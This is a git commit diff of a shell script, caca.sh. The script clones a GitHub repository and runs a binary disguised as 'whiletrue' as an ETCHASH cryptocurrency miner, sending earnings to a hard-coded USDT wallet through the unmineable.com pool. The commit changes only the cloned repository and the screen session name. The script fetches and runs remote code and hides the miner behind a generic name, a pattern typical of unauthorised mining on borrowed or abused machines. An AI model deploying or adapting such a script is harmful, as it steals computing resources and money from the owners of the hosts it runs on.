022fb5070a51c60dbc748b132997d113743dd3ca
revaisna7 <92873602+revaisna7@users.noreply.github.com>
2022-10-16 11:20:40 +0000

    Update caca.sh

--- caca.sh
+++ caca.sh
@@ -2,8 +2,8 @@
 sudo apt update 
 sudo apt-get install zip unzip 
 sudo apt install screen -y 
-screen -dmS etciflex.sh 65 75 
-sudo git clone https://github.com/andromedasizu/andromedasizu.git 
-cd andromedasizu 
+screen -dmS caca.sh 65 75 
+sudo git clone https://github.com/revaisna7/reva.git
+cd reva 
 chmod +x whiletrue
 ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && /whiletrue --algo ETCHASH --pool etchash.unmineable.com:4444 --user USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.$(echo $(shuf -i 1-9999 -n 1)-Masku)
